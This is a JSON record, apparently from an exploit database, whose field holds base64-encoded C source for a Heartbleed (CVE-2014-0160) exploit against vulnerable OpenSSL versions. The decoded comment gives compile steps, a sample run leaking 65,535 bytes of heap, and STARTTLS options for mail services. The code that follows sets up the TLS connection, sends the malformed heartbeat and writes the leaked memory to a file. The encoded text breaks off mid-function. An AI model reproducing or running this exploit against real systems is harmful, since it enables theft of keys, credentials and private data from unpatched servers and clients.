{
    "source": "exploit-database", 
    "exploit": "LyogDQoqIENWRS0yMDE0LTAxNjAgaGVhcnRibGVlZCBPcGVuU1NMIGluZm9ybWF0aW9uIGxlYWsgZXhwbG9pdA0KKiA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiogVGhpcyBleHBsb2l0IHVzZXMgT3BlblNTTCB0byBjcmVhdGUgYW4gZW5jcnlwdGVkIGNvbm5lY3Rpb24NCiogYW5kIHRyaWdnZXIgdGhlIGhlYXJ0YmxlZWQgbGVhay4gVGhlIGxlYWtlZCBpbmZvcm1hdGlvbiBpcw0KKiByZXR1cm5lZCB3aXRoaW4gZW5jcnlwdGVkIFNTTCBwYWNrZXRzIGFuZCBpcyB0aGVuIGRlY3J5cHRlZCANCiogYW5kIHdyb3RlIHRvIGEgZmlsZSB0byBhbm5veSBJRFMvZm9yZW5zaWNzLiBUaGUgZXhwbG9pdCBjYW4gDQoqIHNldCBoZWFydGJlYXQgcGF5bG9hZCBsZW5ndGggYXJiaXRyYXJpbHkgb3IgdXNlIHR3byBwcmVzZXQgDQoqIHZhbHVlcyBmb3IgTlVMTCBhbmQgTUFYIGxlbmd0aC4gVGhlIHZ1bG5lcmFiaWxpdHkgb2NjdXJzIGR1ZSANCiogdG8gYm91bmRzIGNoZWNraW5nIG5vdCBiZWluZyBwZXJmb3JtZWQgb24gYSBoZWFwIHZhbHVlIHdoaWNoIA0KKiBpcyB1c2VyIHN1cHBsaWVkIGFuZCByZXR1cm5lZCB0byB0aGUgdXNlciBhcyBwYXJ0IG9mIERUTFMvVExTIA0KKiBoZWFydGJlYXQgU1NMIGV4dGVuc2lvbi4gQWxsIHZlcnNpb25zIG9mIE9wZW5TU0wgMS4wLjEgdG8gDQoqIDEuMC4xZiBhcmUga25vd24gYWZmZWN0ZWQuIFlvdSBtdXN0IHJ1biB0aGlzIGFnYWluc3QgYSB0YXJnZXQgDQoqIHdoaWNoIGlzIGxpbmtlZCB0byBhIHZ1bG5lcmFibGUgT3BlblNTTCBsaWJyYXJ5IHVzaW5nIERUTFMvVExTLg0KKiBUaGlzIGV4cGxvaXQgbGVha3MgdXB0byA2NTUzNSBieXRlcyBvZiByZW1vdGUgaGVhcCBlYWNoIHJlcXVlc3QNCiogYW5kIGNhbiBiZSBydW4gaW4gYSBsb29wIHVudGlsIHRoZSBjb25uZWN0ZWQgcGVlciBlbmRzIGNvbm5lY3Rpb24uDQoqIFRoZSBkYXRhIGxlYWtlZCBjb250YWlucyAxNiBieXRlcyBvZiByYW5kb20gcGFkZGluZyBhdCB0aGUgZW5kLg0KKiBUaGUgZXhwbG9pdCBjYW4gYmUgdXNlZCBhZ2FpbnN0IGEgY29ubmVjdGluZyBjbGllbnQgb3Igc2VydmVyLA0KKiBpdCBjYW4gYWxzbyBzZW5kIHByZV9jbWQncyB0byBwbGFpbi10ZXh0IHNlcnZpY2VzIHRvIGVzdGFibGlzaA0KKiBhbiBTU0wgc2Vzc2lvbiBzdWNoIGFzIHdpdGggU1RBUlRUTFMgb24gU01UUC9JTUFQL1BPUDMuIENsaWVudHMNCiogd2lsbCBvZnRlbiBmb3JjZWZ1bGx5IGNsb3NlIHRoZSBjb25uZWN0aW9uIGR1cmluZyBsYXJnZSBsZWFrDQoqIHJlcXVlc3RzIHNvIHRyeSB0byBsb3dlciB5b3VyIHBheWxvYWQgcmVxdWVzdCBzaXplLiANCioNCiogQ29tcGlsZWQgb24gQXJjaExpbnV4IHg4Nl82NCBnY2MgNC44LjIgMjAxNDAyMDYgdy9PcGVuU1NMIDEuMC4xZyANCioNCiogRS5nLg0KKiAkIGdjYyAtbHNzbCAtbHNzbDMgLWxjcnlwdG8gaGVhcnRibGVlZC5jIC1vIGhlYXJ0YmxlZWQNCiogJCAuL2hlYXJ0YmxlZWQgLXMgMTkyLjE2OC4xMS4yMyAtcCA0NDMgLWYgb3V0IC10IDENCiogWyBoZWFydGJsZWVkIC0gQ1ZFLTIwMTQtMDE2MCAtIE9wZW5TU0wgaW5mb3JtYXRpb24gbGVhayBleHBsb2l0DQoqIFsgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KKiBbIGNvbm5lY3RpbmcgdG8gMTkyLjE2OC4xMS4yMyA0NDMvdGNwDQoqIFsgY29ubmVjdGVkIHRvIDE5Mi4xNjguMTEuMjMgNDQzL3RjcA0KKiBbIDwzIDwzIDwzIGhlYXJ0IGJsZWVkIDwzIDwzIDwzDQoqIFsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9MjQgbGVuZ3RoPTE2NDA4DQoqIFsgZGVjcnlwdGluZyBTU0wgcGFja2V0DQoqIFsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPTY1NTM1DQoqIFsgZmluYWwgcmVjb3JkIHR5cGU9MjQsIGxlbmd0aD0xNjM4NA0KKiBbIHdyb3RlIDE2MzgxIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnb3V0Jw0KKiBbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPTI0IGxlbmd0aD0xNjQwOA0KKiBbIGRlY3J5cHRpbmcgU1NMIHBhY2tldA0KKiBbIGZpbmFsIHJlY29yZCB0eXBlPTI0LCBsZW5ndGg9MTYzODQNCiogWyB3cm90ZSAxNjM4NCBieXRlcyBvZiBoZWFwIHRvIGZpbGUgJ291dCcNCiogWyBoZWFydGJlYXQgcmV0dXJuZWQgdHlwZT0yNCBsZW5ndGg9MTY0MDgNCiogWyBkZWNyeXB0aW5nIFNTTCBwYWNrZXQNCiogWyBmaW5hbCByZWNvcmQgdHlwZT0yNCwgbGVuZ3RoPTE2Mzg0DQoqIFsgd3JvdGUgMTYzODQgYnl0ZXMgb2YgaGVhcCB0byBmaWxlICdvdXQnDQoqIFsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9MjQgbGVuZ3RoPTE2NDA4DQoqIFsgZGVjcnlwdGluZyBTU0wgcGFja2V0DQoqIFsgZmluYWwgcmVjb3JkIHR5cGU9MjQsIGxlbmd0aD0xNjM4NA0KKiBbIHdyb3RlIDE2Mzg0IGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnb3V0Jw0KKiBbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPTI0IGxlbmd0aD00Mg0KKiBbIGRlY3J5cHRpbmcgU1NMIHBhY2tldA0KKiBbIGZpbmFsIHJlY29yZCB0eXBlPTI0LCBsZW5ndGg9MTgNCiogWyB3cm90ZSAxOCBieXRlcyBvZiBoZWFwIHRvIGZpbGUgJ291dCcNCiogWyBkb25lLg0KKiAkIGxzIC1hbCBvdXQNCiogLXJ3eC0tLS0tLSAxIGZhbnRhc3RpYyBmYW50YXN0aWMgNjU1NTQgQXByIDExIDEzOjUzIG91dA0KKiAkIGhleGR1bXAgLUMgb3V0DQoqIC0gc25pcCAtIHNuaXAgIA0KKg0KKiBVc2UgZm9sbG93aW5nIGV4YW1wbGUgY29tbWFuZCB0byBnZW5lcmF0ZSBjZXJ0aWZpY2F0ZXMgZm9yIGNsaWVudHMuDQoqDQoqICQgb3BlbnNzbCByZXEgLXg1MDkgLW5vZGVzIC1kYXlzIDM2NSAtbmV3a2V5IHJzYToyMDQ4IFwNCiogLWtleW91dCBzZXJ2ZXIua2V5IC1vdXQgc2VydmVyLmNydA0KKg0KKiBEZWJpYW4gY29tcGlsZSB3aXRoICJnY2MgaGVhcnRibGVlZC5jIC1vIGhlYXJ0YmxlZWQgLVdsLC1Cc3RhdGljIFwNCiogLWxzc2wgLVdsLC1CZHluYW1pYyAtbHNzbDMgLWxjcnlwdG8iIA0KKg0KKiB0b2RvOiBhZGQgdWRwL2R0bHMgc3VwcG9ydC4NCioNCiogLSBIYWNrZXIgRmFudGFzdGljDQoqICAgaHR0cDovL3d3dy5tZHNlYy5jby51aw0KKg0KKi8NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGdldG9wdC5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPg0KI2luY2x1ZGUgPGludHR5cGVzLmg+DQojaW5jbHVkZSA8b3BlbnNzbC9iaW8uaD4NCiNpbmNsdWRlIDxvcGVuc3NsL3NzbC5oPg0KI2luY2x1ZGUgPG9wZW5zc2wvZXJyLmg+DQojaW5jbHVkZSA8b3BlbnNzbC9ldnAuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL3RsczEuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL3JhbmQuaD4NCiNpbmNsdWRlIDxvcGVuc3NsL2J1ZmZlci5oPg0KDQojZGVmaW5lIG4ycyhjLHMpKChzPSgoKHVuc2lnbmVkIGludCkoY1swXSkpPDwgOCl8IFwNCgkJKCgodW5zaWduZWQgaW50KShjWzFdKSkgICAgKSksYys9MikNCiNkZWZpbmUgczJuKHMsYykgKChjWzBdPSh1bnNpZ25lZCBjaGFyKSgoKHMpPj4gOCkmMHhmZiksIFwNCgkJIGNbMV09KHVuc2lnbmVkIGNoYXIpKCgocykgICAgKSYweGZmKSksYys9MikNCg0KaW50IGZpcnN0ID0gMDsNCmludCBsZWFrYnl0ZXMgPSAwOw0KaW50IHJlcGVhdCA9IDE7DQppbnQgYmFkcGFja2V0cyA9IDA7DQoNCnR5cGVkZWYgc3RydWN0IHsNCglpbnQgc29ja2V0Ow0KCVNTTCAqc3NsSGFuZGxlOw0KCVNTTF9DVFggKnNzbENvbnRleHQ7DQp9IGNvbm5lY3Rpb247DQoNCnR5cGVkZWYgc3RydWN0IHsNCiAgdW5zaWduZWQgY2hhciB0eXBlOw0KICBzaG9ydCB2ZXJzaW9uOw0KICB1bnNpZ25lZCBpbnQgbGVuZ3RoOw0KICB1bnNpZ25lZCBjaGFyIGhidHlwZTsNCiAgdW5zaWduZWQgaW50IHBheWxvYWRfbGVuZ3RoOw0KICB2b2lkKiBwYXlsb2FkOw0KfSBoZWFydGJlYXQ7DQoNCnZvaWQgc3NsX2luaXQoKTsNCnZvaWQgdXNhZ2UoKTsNCmludCB0Y3BfY29ubmVjdChjaGFyKixpbnQpOw0KaW50IHRjcF9iaW5kKGNoYXIqLCBpbnQpOw0KY29ubmVjdGlvbiogdGxzX2Nvbm5lY3QoaW50KTsNCmNvbm5lY3Rpb24qIHRsc19iaW5kKGludCk7DQppbnQgcHJlX2NtZChpbnQsaW50LGludCk7DQp2b2lkKiBoZWFydGJsZWVkKGNvbm5lY3Rpb24qICx1bnNpZ25lZCBpbnQpOw0Kdm9pZCogc25lYWt5bGVha3koY29ubmVjdGlvbiogLGNoYXIqLCBpbnQpOw0KDQppbnQgdGNwX2Nvbm5lY3QoY2hhciogc2VydmVyLGludCBwb3J0KXsNCglpbnQgc2QscmV0Ow0KCXN0cnVjdCBob3N0ZW50ICpob3N0Ow0KICAgICAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gc2E7DQogICAgICAgIGhvc3QgPSBnZXRob3N0YnluYW1lKHNlcnZlcik7DQogICAgICAgIHNkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCAwKTsNCiAgICAgICAgaWYoc2Q9PS0xKXsNCgkJcHJpbnRmKCJbIV0gY2Fubm90IGNyZWF0ZSBzb2NrZXRcbiIpOw0KCQlleGl0KDApOw0KCX0NCglzYS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgICAgICAgc2Euc2luX3BvcnQgPSBodG9ucyhwb3J0KTsNCiAgICAgICAgc2Euc2luX2FkZHIgPSAqKChzdHJ1Y3QgaW5fYWRkciAqKSBob3N0LT5oX2FkZHIpOw0KICAgICAgICBiemVybygmKHNhLnNpbl96ZXJvKSw4KTsNCglwcmludGYoIlsgY29ubmVjdGluZyB0byAlcyAlZC90Y3BcbiIsc2VydmVyLHBvcnQpOw0KICAgICAgICByZXQgPSBjb25uZWN0KHNkLChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKTsNCglpZihyZXQ9PTApew0KCQlwcmludGYoIlsgY29ubmVjdGVkIHRvICVzICVkL3RjcFxuIixzZXJ2ZXIscG9ydCk7DQoJfQ0KCWVsc2V7DQoJCXByaW50ZigiWyFdIEZBVEFMOiBjb3VsZCBub3QgY29ubmVjdCB0byAlcyAlZC90Y3BcbiIsc2VydmVyLHBvcnQpOw0KCQlleGl0KDApOw0KCX0NCglyZXR1cm4gc2Q7DQp9DQoNCmludCB0Y3BfYmluZChjaGFyKiBzZXJ2ZXIsIGludCBwb3J0KXsNCglpbnQgc2QsIHJldCwgdmFsPTE7DQoJc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCglzdHJ1Y3QgaG9zdGVudCAqaG9zdDsNCglob3N0ID0gZ2V0aG9zdGJ5bmFtZShzZXJ2ZXIpOw0KCXNkPXNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KCWlmKHNkPT0tMSl7DQogICAgCQlwcmludGYoIlshXSBjYW5ub3QgY3JlYXRlIHNvY2tldFxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCW1lbXNldCgmc2luLDAsc2l6ZW9mKHNpbikpOw0KCXNpbi5zaW5fYWRkcj0qKChzdHJ1Y3QgaW5fYWRkciAqKSBob3N0LT5oX2FkZHIpOw0KCXNpbi5zaW5fZmFtaWx5PUFGX0lORVQ7DQoJc2luLnNpbl9wb3J0PWh0b25zKHBvcnQpOw0KICAgIAlzZXRzb2Nrb3B0KHNkLFNPTF9TT0NLRVQsU09fUkVVU0VBRERSLCZ2YWwsc2l6ZW9mKHZhbCkpOw0KCXJldCA9IGJpbmQoc2QsKHN0cnVjdCBzb2NrYWRkciAqKSZzaW4sc2l6ZW9mKHNpbikpOw0KCWlmKHJldD09LTEpew0KCQlwcmludGYoIlshXSBjYW5ub3QgYmluZCBzb2NrZXRcbiIpOw0KCQlleGl0KDApOw0KCX0NCglsaXN0ZW4oc2QsNSk7DQoJcmV0dXJuKHNkKTsNCn0NCg0KDQp2b2lkIHNzbF9pbml0KCl7DQogICAgICAgIFNTTF9sb2FkX2Vycm9yX3N0cmluZ3MoKTsNCiAgICAgICAgU1NMX2xpYnJhcnlfaW5pdCgpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfZGlnZXN0cygpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfYWxnb3JpdGhtcygpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfY2lwaGVycygpOw0KfQ0KDQpjb25uZWN0aW9uKiB0bHNfY29ubmVjdChpbnQgc2Qpew0KICAgICAgICBjb25uZWN0aW9uICpjOw0KCWMgPSBtYWxsb2Moc2l6ZW9mKGNvbm5lY3Rpb24pKTsNCiAgICAgICAgaWYoYz09TlVMTCl7DQoJCXByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCWMtPnNvY2tldCA9IHNkOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBOVUxMOw0KICAgICAgICBjLT5zc2xDb250ZXh0ID0gTlVMTDsNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IFNTTF9DVFhfbmV3KFNTTHYyM19jbGllbnRfbWV0aG9kKCkpOw0KCVNTTF9DVFhfc2V0X29wdGlvbnMoYy0+c3NsQ29udGV4dCwgU1NMX09QX0FMTCB8IFNTTF9PUF9OT19TU0x2MiB8IFNTTF9PUF9OT19TU0x2Myk7DQogICAgICAgIGlmKGMtPnNzbENvbnRleHQ9PU5VTEwpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBTU0xfbmV3KGMtPnNzbENvbnRleHQpOw0KICAgICAgICBpZihjLT5zc2xIYW5kbGU9PU5VTEwpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBpZighU1NMX3NldF9mZChjLT5zc2xIYW5kbGUsYy0+c29ja2V0KSkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQogICAgICAgIGlmKFNTTF9jb25uZWN0KGMtPnNzbEhhbmRsZSkhPTEpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBpZighYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9FTkFCTEVEIHx8DQogICAgICAgICAgICAgICAgYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9ET05UX1NFTkRfUkVRVUVTVFMpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyB3YXJuaW5nOiBoZWFydGJlYXQgZXh0ZW5zaW9uIGlzIHVuc3VwcG9ydGVkICh0cnkgYW55d2F5KVxuIik7DQogICAgICAgIH0NCglyZXR1cm4gYzsNCn0NCg0KY29ubmVjdGlvbiogdGxzX2JpbmQoaW50IHNkKXsNCglpbnQgYnl0ZXM7DQogICAgICAgIGNvbm5lY3Rpb24gKmM7DQogICAgICAgIGNoYXIqIGJ1ZjsNCglidWYgPSBtYWxsb2MoNDA5Nik7DQogICAgICAgIGlmKGJ1Zj09TlVMTCl7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCiAgICAgICAgICAgICAgICBleGl0KDApOw0KICAgICAgICB9DQoJbWVtc2V0KGJ1ZiwwLDQwOTYpOw0KCWMgPSBtYWxsb2Moc2l6ZW9mKGNvbm5lY3Rpb24pKTsNCglpZihjPT1OVUxMKXsNCiAgICAgICAgICAgICAgICBwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KICAgICAgICAgICAgICAgIGV4aXQoMCk7DQogICAgICAgIH0NCgljLT5zb2NrZXQgPSBzZDsNCiAgICAgICAgYy0+c3NsSGFuZGxlID0gTlVMTDsNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IE5VTEw7DQogICAgICAgIGMtPnNzbENvbnRleHQgPSBTU0xfQ1RYX25ldyhTU0x2MjNfc2VydmVyX21ldGhvZCgpKTsNCiAgICAgICAgaWYoYy0+c3NsQ29udGV4dD09TlVMTCkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQoJU1NMX0NUWF9zZXRfb3B0aW9ucyhjLT5zc2xDb250ZXh0LCBTU0xfT1BfQUxMIHwgU1NMX09QX05PX1NTTHYyIHwgU1NMX09QX05PX1NTTHYzKTsNCglTU0xfQ1RYX1NSUF9DVFhfaW5pdChjLT5zc2xDb250ZXh0KTsNCglTU0xfQ1RYX3VzZV9jZXJ0aWZpY2F0ZV9maWxlKGMtPnNzbENvbnRleHQsICIuL3NlcnZlci5jcnQiLCBTU0xfRklMRVRZUEVfUEVNKTsNCglTU0xfQ1RYX3VzZV9Qcml2YXRlS2V5X2ZpbGUoYy0+c3NsQ29udGV4dCwgIi4vc2VydmVyLmtleSIsIFNTTF9GSUxFVFlQRV9QRU0pOyAgICAgICANCglpZighU1NMX0NUWF9jaGVja19wcml2YXRlX2tleShjLT5zc2xDb250ZXh0KSl7DQoJCXByaW50ZigiWyFdIEZBVEFMOiBwcml2YXRlIGtleSBkb2VzIG5vdCBtYXRjaCB0aGUgY2VydGlmaWNhdGUgcHVibGljIGtleVxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCWMtPnNzbEhhbmRsZSA9IFNTTF9uZXcoYy0+c3NsQ29udGV4dCk7DQogICAgICAgIGlmKGMtPnNzbEhhbmRsZT09TlVMTCkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQogICAgICAgIGlmKCFTU0xfc2V0X2ZkKGMtPnNzbEhhbmRsZSxjLT5zb2NrZXQpKQ0KICAgICAgICAgICAgICAgIEVSUl9wcmludF9lcnJvcnNfZnAoc3RkZXJyKTsNCiAgICAgICAgaW50IHJjID0gU1NMX2FjY2VwdChjLT5zc2xIYW5kbGUpOw0KCXByaW50ZiAoIlsgU1NMIGNvbm5lY3Rpb24gdXNpbmcgJXNcbiIsIFNTTF9nZXRfY2lwaGVyIChjLT5zc2xIYW5kbGUpKTsNCglieXRlcyA9IFNTTF9yZWFkKGMtPnNzbEhhbmRsZSwgYnVmLCA0MDk1KTsNCglwcmludGYoIlsgcmVjaWV2ZWQ6ICVkIGJ5dGVzIC0gc2hvd2luZyBvdXRwdXRcbiVzXG5bXG4iLGJ5dGVzLGJ1Zik7DQoJaWYoIWMtPnNzbEhhbmRsZS0+dGxzZXh0X2hlYXJ0YmVhdCAmIFNTTF9UTFNFWFRfSEJfRU5BQkxFRCB8fA0KICAgICAgICAgICAgICAgIGMtPnNzbEhhbmRsZS0+dGxzZXh0X2hlYXJ0YmVhdCAmIFNTTF9UTFNFWFRfSEJfRE9OVF9TRU5EX1JFUVVFU1RTKXsNCiAgICAgICAgICAgICAgICBwcmludGYoIlsgd2FybmluZzogaGVhcnRiZWF0IGV4dGVuc2lvbiBpcyB1bnN1cHBvcnRlZCAodHJ5IGFueXdheSlcbiIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBjOw0KfQ0KDQppbnQgcHJlX2NtZChpbnQgc2QsaW50IHByZWNtZCxpbnQgdmVyYm9zZSl7DQoJLyogdGhpcyBmdW5jdGlvbiBjYW4gYmUgdXNlZCB0byBzZW5kIGNvbW1hbmRzIHRvIGEgcGxhaW4tdGV4dA0KCXNlcnZpY2Ugb3IgY2xpZW50IGJlZm9yZSBoZWFydGJsZWVkIGV4cGxvaXQgYXR0ZW1wdC4gZS5nLiBTVEFSVFRMUyAqLw0KCWludCByYywgZ28gPSAwOw0KCWNoYXIqIGJ1ZmZlcjsNCgljaGFyKiBsaW5lMTsNCgljaGFyKiBsaW5lMjsgIA0KCXN3aXRjaChwcmVjbWQpew0KCQljYXNlIDA6DQoJCQlsaW5lMSA9ICJFSExPIHRlc3RcbiI7DQoJCQlsaW5lMiA9ICJTVEFSVFRMU1xuIjsNCgkJCWJyZWFrOw0KCQljYXNlIDE6DQoJCQlsaW5lMSA9ICJDQVBBXG4iOw0KCQkJbGluZTIgPSAiU1RMU1xuIjsNCgkJCWJyZWFrOw0KCQljYXNlIDI6DQoJCQlsaW5lMSA9ICJhMDAxIENBUEJcbiI7DQoJCQlsaW5lMiA9ICJhMDAyIFNUQVJUVExTXG4iOw0KCQkJYnJlYWs7DQoJCWRlZmF1bHQ6DQoJCQlnbyA9IDE7DQoJCQlicmVhazsNCgl9DQoJaWYoZ289PTApew0KCQlidWZmZXIgPSBtYWxsb2MoMjA0OSk7DQoJICAgICAgICBpZihidWZmZXI9PU5VTEwpew0KICAgICAgICAgICAgICAgIAlwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KICAgICAgICAgICAgICAgIAlleGl0KDApOw0KCSAgICAgICAgfQ0KCQltZW1zZXQoYnVmZmVyLDAsMjA0OSk7DQoJCXJjID0gcmVhZChzZCxidWZmZXIsMjA0OCk7DQoJCXByaW50ZigiWyBiYW5uZXI6ICVzIixidWZmZXIpOw0KCQlzZW5kKHNkLGxpbmUxLHN0cmxlbihsaW5lMSksMCk7DQoJCW1lbXNldChidWZmZXIsMCwyMDQ5KTsNCgkJcmMgPSByZWFkKHNkLGJ1ZmZlciwyMDQ4KTsNCgkJaWYodmVyYm9zZT09MSl7DQoJCQlwcmludGYoIiVzXG4iLGJ1ZmZlcik7DQoJCX0NCgkJc2VuZChzZCxsaW5lMixzdHJsZW4obGluZTIpLDApOw0KCQltZW1zZXQoYnVmZmVyLDAsMjA0OSk7DQoJCXJjID0gcmVhZChzZCxidWZmZXIsMjA0OCk7DQoJCWlmKHZlcmJvc2U9PTEpew0KCQkJcHJpbnRmKCIlc1xuIixidWZmZXIpOw0KCQl9DQoJfQ0KCXJldHVybiBzZDsNCn0NCg0Kdm9pZCogaGVhcnRibGVlZChjb25uZWN0aW9uICpjLHVuc2lnbmVkIGludCB0eXBlKXsNCgl1bnNpZ25lZCBjaGFyICpidWYsICpwOw0KICAgICAgICBpbnQgcmV0Ow0KCWJ1ZiA9IE9QRU5TU0xfbWFsbG9jKDEgKyAyKTsNCglpZihidWY9PU5VTEwpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQogICAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgfQ0KCXAgPSBidWY7DQogICAgICAgICpwKysgPSBUTFMxX0hCX1JFUVVFU1Q7DQoJc3dpdGNoKHR5cGUpew0KCQljYXNlIDA6DQoJCQlzMm4oMHgwLHApOw0KCQkJYnJlYWs7DQoJCWNhc2UgMToNCgkJCXMybigweGZmZmYscCk7DQoJCQlicmVhazsNCgkJZGVmYXVsdDoNCgkJCXByaW50ZigiWyBzZXR0aW5nIGhlYXJ0YmVhdCBwYXlsb2FkX2xlbmd0aCB0byAldVxuIix0eXBlKTsNCgkJCXMybih0eXBlLHApOw0KCQkJYnJlYWs7DQoJfQ0KCXByaW50ZigiWyA8MyA8MyA8MyBoZWFydCBibGVlZCA8MyA8MyA8M1xuIik7DQogICAgICAgIHJldCA9IHNzbDNfd3JpdGVfYnl0ZXMoYy0+c3NsSGFuZGxlLCBUTFMxX1JUX0hFQVJUQkVBVCwgYnVmLCAzKTsNCiAgICAgICAgT1BFTlNTTF9mcmVlKGJ1Zik7DQoJcmV0dXJuIGM7DQp9DQoNCnZvaWQqIHNuZWFreWxlYWt5KGNvbm5lY3Rpb24gKmMsY2hhciogZmlsZW5hbWUsIGludCB2ZXJib3NlKXsNCgljaGFyICpwOw0KICAgICAgICBpbnQgc3NsX21ham9yLHNzbF9taW5vcixhbDsNCiAgICAgICAgaW50IGVuY19lcnIsbixpOw0KICAgICAgICBTU0wzX1JFQ09SRCAqcnI7DQogICAgICAgIFNTTF9TRVNTSU9OICpzZXNzOw0KCVNTTCogczsNCiAgICAgICAgdW5zaWduZWQgY2hhciBtZFtFVlBfTUFYX01EX1NJWkVdOw0KICAgICAgICBzaG9ydCB2ZXJzaW9uOw0KICAgICAgICB1bnNpZ25lZCBtYWNfc2l6ZSwgb3JpZ19sZW47DQogICAgICAgIHNpemVfdCBleHRyYTsNCiAgICAgICAgcnI9ICYoYy0+c3NsSGFuZGxlLT5zMy0+cnJlYyk7DQogICAgICAgIHNlc3M9Yy0+c3NsSGFuZGxlLT5zZXNzaW9uOw0KICAgICAgICBzID0gYy0+c3NsSGFuZGxlOw0KICAgICAgICBpZiAoYy0+c3NsSGFuZGxlLT5vcHRpb25zICYgU1NMX09QX01JQ1JPU09GVF9CSUdfU1NMVjNfQlVGRkVSKQ0KICAgICAgICAgICAgICAgIGV4dHJhPVNTTDNfUlRfTUFYX0VYVFJBOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgZXh0cmE9MDsNCiAgICAgICAgaWYgKChzLT5yc3RhdGUgIT0gU1NMX1NUX1JFQURfQk9EWSkgfHwNCiAgICAgICAgICAgICAgICAocy0+cGFja2V0X2xlbmd0aCA8IFNTTDNfUlRfSEVBREVSX0xFTkdUSCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG49c3NsM19yZWFkX24ocywgU1NMM19SVF9IRUFERVJfTEVOR1RILCBzLT5zMy0+cmJ1Zi5sZW4sIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG4gPD0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ290byBhcHBsZTsgDQogICAgICAgICAgICAgICAgICAgICAgICBzLT5yc3RhdGU9U1NMX1NUX1JFQURfQk9EWTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHA9cy0+cGFja2V0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcnItPnR5cGU9ICoocCsrKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNzbF9tYWpvcj0gKihwKyspOw0KICAgICAgICAgICAgICAgICAgICAgICAgc3NsX21pbm9yPSAqKHArKyk7DQogICAgICAgICAgICAgICAgICAgICAgICB2ZXJzaW9uPShzc2xfbWFqb3I8PDgpfHNzbF9taW5vcjsNCiAgICAgICAgICAgICAgICAgICAgICAgIG4ycyhwLHJyLT5sZW5ndGgpOw0KCQkJaWYocnItPnR5cGU9PTI0KXsNCgkJCQlwcmludGYoIlsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9JWQgbGVuZ3RoPSV1XG4iLHJyLT50eXBlLCByci0+bGVuZ3RoKTsNCgkJCQlpZihyci0+bGVuZ3RoID4gMTY4MzQpew0KCQkJCQlwcmludGYoIlsgZXJyb3I6IGdvdCBhIG1hbGZvcm1lZCBUTFMgbGVuZ3RoLlxuIik7DQoJCQkJCWV4aXQoMCk7DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZXsNCgkJCQlwcmludGYoIlsgaW5jb3JyZWN0IHJlY29yZCB0eXBlPSV